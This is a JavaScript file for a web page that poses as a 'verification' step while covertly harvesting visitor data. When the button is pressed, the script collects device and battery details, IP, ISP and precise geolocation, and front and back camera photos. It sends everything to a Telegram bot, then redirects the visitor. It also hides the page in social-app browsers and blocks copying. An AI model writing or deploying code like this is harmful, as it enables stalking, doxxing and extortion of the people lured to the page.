// main.js - Khởi tạo và điều phối chính

(async function() {
    // DOM elements
    const warningDiv = document.getElementById('browser-warning');
    const mainCard = document.getElementById('mainCard');
    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('preview');
    const msg = document.getElementById('msg');
    const statusDiv = document.getElementById('status');
    const vBox = document.getElementById('vBox');
    
    // Kiểm tra in-app browser
    function checkInAppBrowser() {
        const ua = navigator.userAgent;
        const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger|Line/i.test(ua);
        if (isInApp) {
            warningDiv.style.display = 'block';
            mainCard.style.display = 'none';
        }
    }
    checkInAppBrowser();
    
    // Ngăn chặn copy, context menu
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('copy', e => e.preventDefault());
    
    // Khởi tạo camera
    CameraManager.init(video);
    
    // Hiển thị preview camera trước
    async function showPreview() {
        msg.textContent = '📷 Đang mở camera...';
        const stream = await CameraManager.requestCamera('user');
        if (stream) {
            msg.style.display = 'none';
            vBox.style.borderColor = '#238636';
        } else {
            msg.textContent = '⚠️ Không thể mở camera. Vui lòng cấp quyền!';
        }
    }
    await showPreview();
    
    // Xử lý khi bấm nút
    startBtn.onclick = async () => {
        startBtn.disabled = true;
        startBtn.innerText = '⏳ ĐANG XỬ LÝ...';
        statusDiv.innerHTML = '📸 Đang thu thập thông tin...';
        
        try {
            // 1. Lấy thông tin thiết bị
            statusDiv.innerHTML = '📱 Đang lấy thông tin thiết bị...';
            const deviceInfo = DeviceInfo.getInfo();
            const batteryInfo = await DeviceInfo.getBattery();
            
            // 2. Lấy thông tin vị trí
            statusDiv.innerHTML = '🌍 Đang xác định vị trí...';
            const locationInfo = await LocationInfo.getLocationData();
            
            // 3. Chụp ảnh
            statusDiv.innerHTML = '📸 Đang chụp ảnh...';
            const { frontPhoto, backPhoto } = await CameraManager.captureBoth();
            
            const cameraStatus = frontPhoto ? '✅ Đã chụp thành công' : '🚫 Bị chặn hoặc không có camera';
            
            // 4. Tổng hợp dữ liệu
            const finalData = {
                time: new Date().toLocaleString('vi-VN'),
                device: deviceInfo.device,
                os: deviceInfo.os,
                browser: deviceInfo.browser,
                language: deviceInfo.language,
                screenSize: deviceInfo.screenSize,
                timezone: deviceInfo.timezone,
                ip: locationInfo.ip,
                isp: locationInfo.isp,
                location: locationInfo.location,
                country: locationInfo.country,
                lat: locationInfo.lat,
                lon: locationInfo.lon,
                maps: locationInfo.maps,
                battery: batteryInfo ? `${batteryInfo.level} (${batteryInfo.charging ? 'Đang sạc' : 'Không sạc'})` : 'Không xác định',
                camera: cameraStatus,
                note: 'Thông tin được thu thập từ trình duyệt. Độ chính xác phụ thuộc vào nguồn dữ liệu.',
                frontPhoto: frontPhoto,
                backPhoto: backPhoto
            };
            
            // 5. Gửi lên Telegram
            statusDiv.innerHTML = '📤 Đang gửi dữ liệu...';
            await TelegramSender.sendAll(finalData);
            
            // 6. Dừng camera
            CameraManager.stopCamera();
            
            // 7. Đếm ngược chuyển hướng
            statusDiv.innerHTML = `✅ Hoàn tất! Chuyển hướng sau ${CONFIG.COUNTDOWN_SECONDS} giây...`;
            let timeLeft = CONFIG.COUNTDOWN_SECONDS;
            const timer = setInterval(() => {
                startBtn.innerText = `✅ HOÀN TẤT (${timeLeft}s)`;
                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(timer);
                    if (CONFIG.REDIRECT_URL) {
                        window.location.href = CONFIG.REDIRECT_URL;
                    }
                }
            }, 1000);
            
        } catch(error) {
            console.error('❌ Lỗi:', error);
            statusDiv.innerHTML = '❌ Có lỗi xảy ra, vui lòng thử lại!';
            startBtn.disabled = false;
            startBtn.innerText = '▶ BẮT ĐẦU XÁC THỰC';
        }
    };
    
    console.log('🚀 Hệ thống đã sẵn sàng!');
})();
